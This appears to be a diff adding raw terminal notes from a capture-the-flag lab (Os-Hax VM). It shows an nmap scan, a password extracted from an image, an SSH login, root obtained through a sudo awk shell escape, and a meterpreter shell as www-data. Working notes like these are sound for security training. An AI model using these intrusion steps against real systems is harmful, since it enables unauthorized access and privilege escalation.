@@ -1,0 +1,158 @@
+[200~hack@kali:~$ nmap -A -p- 192.168.1.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 21:19 CET
+Nmap scan report for jax.homenet.telecomitalia.it (192.168.1.13)
+Host is up (0.00041s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)
+|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)                                    
+|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)                                  
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                
+|_http-server-header: Apache/2.4.18 (Ubuntu)                                                       
+|_http-title: Hacker_James                                                                         
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                            
+                                                                                                   
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     
+Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds                                       
+hack@kali:~$                                                   
+
+
+
+hack@kali:~/CTF/Os-Hax$ strings flaghost.png | grep pass
+passw@45
+
+
+
+web:Hacker@4514
+
+
+
+hack@kali:~/CTF/Os-Hax$ ssh web@192.168.1.13
+web@192.168.1.13's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+194 packages can be updated.
+112 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Nov  1 19:26:26 2019 from 192.168.1.15
+$ 
+$ 
+$ id
+uid=1001(web) gid=1000(uname-a) groups=1000(uname-a)
+$ 
+$ sudo -l
+Matching Defaults entries for web on jax:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User web may run the following commands on jax:
+    (root) NOPASSWD: /usr/bin/awk
+sh: 1: bin/sh: not found
+$ sudo awk 'BEGIN {system("/bin/sh")}'   
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+final.txt
+# cat final.txt
+    ______ ____ _   __ ___     __         ____   ____   ____  ______     ______ __     ___    ______
+   / ____//  _// | / //   |   / /        / __ \ / __ \ / __ \/_  __/    / ____// /    /   |  / ____/
+  / /_    / / /  |/ // /| |  / /        / /_/ // / / // / / / / /      / /_   / /    / /| | / / __  
+ / __/  _/ / / /|  // ___ | / /___     / _, _// /_/ // /_/ / / /      / __/  / /___ / ___ |/ /_/ /  
+/_/    /___//_/ |_//_/  |_|/_____/    /_/ |_| \____/ \____/ /_/      /_/    /_____//_/  |_|\____/  
+
+
+
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Rahul_Gehlaut  =>> https://www.linkedin.com/in/rahulgehlaut/
+
+Web_Site ==>> http://jameshacker.me
+# 
+
+
+
+
+
+
+
+
+meterpreter > shell
+Process 1761 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python -c "import pty;pty.spawn('/bin/bash')"
+www-data@jax:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
+
+www-data@jax:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls
+ls
+404.php        js                 single.php
+archive.php    package-lock.json  style-editor-customizer.css
+classes        package.json       style-editor-customizer.scss
+comments.php   page.php           style-editor.css
+fonts          postcss.config.js  style-editor.scss
+footer.php     print.css          style-rtl.css
+functions.php  print.scss         style.css
+header.php     readme.txt         style.scss
+image.php      sass               template-parts
+inc            screenshot.png
+index.php      search.php
+www-data@jax:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cd ..
+cd ..
+www-data@jax:/var/www/html/wordpress/wp-content/themes$ ls
+ls
+index.php  twentynineteen  twentyseventeen  twentysixteen
+www-data@jax:/var/www/html/wordpress/wp-content/themes$ cd
+cd
+bash: cd: HOME not set
+www-data@jax:/var/www/html/wordpress/wp-content/themes$ cd /home
+cd /home
+www-data@jax:/home$ ls
+ls
+user-a  web
+www-data@jax:/home$ cd web
+cd web
+www-data@jax:/home/web$ ls
+ls
+flag3.txt
+www-data@jax:/home/web$ cat flag3.txt
+cat flag3.txt
+   ______          ______          ____                 __ 
+  / ____/____     /_  __/____     / __ \ ____   ____   / /_
+ / / __ / __ \     / /  / __ \   / /_/ // __ \ / __ \ / __/
+/ /_/ // /_/ /    / /  / /_/ /  / _, _// /_/ // /_/ // /_  
+\____/ \____/    /_/   \____/  /_/ |_| \____/ \____/ \__/  
+                                                           
+
+MD5-HASH : 40740735d446c27cd551f890030f7c75
+
+
+
+
+
